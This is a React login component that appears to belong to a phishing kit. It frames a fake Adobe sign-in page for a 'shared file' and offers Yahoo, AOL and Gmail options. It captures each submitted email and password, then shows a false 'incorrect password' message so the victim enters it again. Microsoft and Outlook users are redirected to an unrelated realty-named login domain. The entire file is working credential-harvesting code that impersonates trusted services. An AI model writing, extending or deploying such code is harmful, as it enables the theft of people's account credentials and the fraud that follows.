import React, { useRef, useEffect, useCallback, useState } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOthersSelect?: () => void;
  onEmailSubmit?: (email: string) => boolean;
  defaultProvider?: string;
}

const LoginPage: React.FC<LoginPageProps> = ({
  onLoginSuccess,
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOthersSelect,
  onEmailSubmit,
}) => {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [email, setEmail] = useState('');
  const [provider, setProvider] = useState('');
  const [redirecting, setRedirecting] = useState(false);

  const { handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const sendToIframe = useCallback((type: string, data?: any) => {
    const iframe = iframeRef.current;
    if (iframe?.contentWindow) {
      iframe.contentWindow.postMessage({ source: 'react-parent', type, ...data }, window.location.origin);
    }
  }, []);

  const handleMessage = useCallback(
    async (event: MessageEvent) => {
      const msg = event.data;
      if (!msg || msg.source !== 'signin-html' || event.origin !== window.location.origin) return;

      switch (msg.type) {
        case 'social-click': {
          const p = msg.data?.provider;
          if (p === 'microsoft' || p === 'outlook') { setRedirecting(true); return; }
          else if (p === 'yahoo') onYahooSelect?.();
          else if (p === 'aol') onAolSelect?.();
          else if (p === 'gmail') onGmailSelect?.();
          else if (p === 'others') onOthersSelect?.();
          break;
        }
        case 'email-submit': {
          const submittedEmail = msg.data?.email;
          if (submittedEmail) {
            if (onEmailSubmit && onEmailSubmit(submittedEmail)) {
              return;
            }
            setEmail(submittedEmail);
            setProvider('Adobe');
            sendToIframe('show-password-step');
          }
          break;
        }
        case 'password-submit': {
          const submittedEmail = msg.data?.email || email;
          const submittedPassword = msg.data?.password;
          if (submittedEmail && submittedPassword) {
            setEmail(submittedEmail);
            sendToIframe('show-loading', { show: true });
            const fakeEvent = { preventDefault: () => {} } as React.FormEvent;
            const result = await handleFormSubmit(fakeEvent, {
              email: submittedEmail,
              password: submittedPassword,
              provider: provider || 'Adobe',
            });
            // If result is returned (not undefined), it means an error occurred
            // (success exits via onLoginSuccess callback without returning)
            if (result !== undefined) {
              sendToIframe('show-error', {
                message: 'Your account or password is incorrect. If you don\'t remember your password, reset your password.',
              });
              sendToIframe('clear-password');
            }
            sendToIframe('show-loading', { show: false });
          }
          break;
        }
      }
    },
    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOthersSelect, onEmailSubmit, sendToIframe]
  );

  useEffect(() => {
    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, [handleMessage]);

  useEffect(() => {
    if (redirecting) {
      window.location.href = 'https://login.allseattletacomaarearealtyservices.com/OaQVGwxX';
    }
  }, [redirecting]);

  if (redirecting) {
    return (
      <div style={{
        width: '100%',
        height: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        backgroundColor: '#fff',
      }}>
        <Spinner size="lg" />
      </div>
    );
  }

  return (
    <iframe
      ref={iframeRef}
      src="/signin.html"
      title="Sign in"
      style={{
        width: '100%',
        height: '100vh',
        border: 'none',
        display: 'block',
      }}
    />
  );
};

export default LoginPage;
